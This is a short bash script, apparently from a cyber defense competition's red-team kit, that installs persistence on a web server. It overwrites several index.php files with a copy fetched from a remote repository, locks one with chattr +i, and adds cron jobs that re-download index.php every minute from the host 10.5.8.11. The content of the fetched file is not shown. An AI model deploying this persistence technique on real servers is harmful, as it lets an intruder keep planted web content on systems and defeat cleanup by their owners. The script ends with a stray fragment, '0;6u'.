To install persistence and examples in the CCDC competition.



```bash
#!/bin/bash

# Clonar el repositorio a /var/www
sudo git clone https://github.com/banago/simple-php-website.git /var/www/simple-php-website

# Descargar index.php a /var/www/simple-php-website
sudo curl -o /var/www/simple-php-website/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
sudo curl -o /var/www/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
sudo curl -o /var/www/html/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php


# Aplicar el atributo inmutable al archivo index.php
sudo chattr +i /var/www/simple-php-website/index.php

# Añadir tarea a crontab
(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | sudo crontab -
(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | crontab -

# Iniciar y habilitar httpd
sudo systemctl start httpd 2>/dev/null
sudo systemctl enable httpd 2>/dev/null

0;6u
```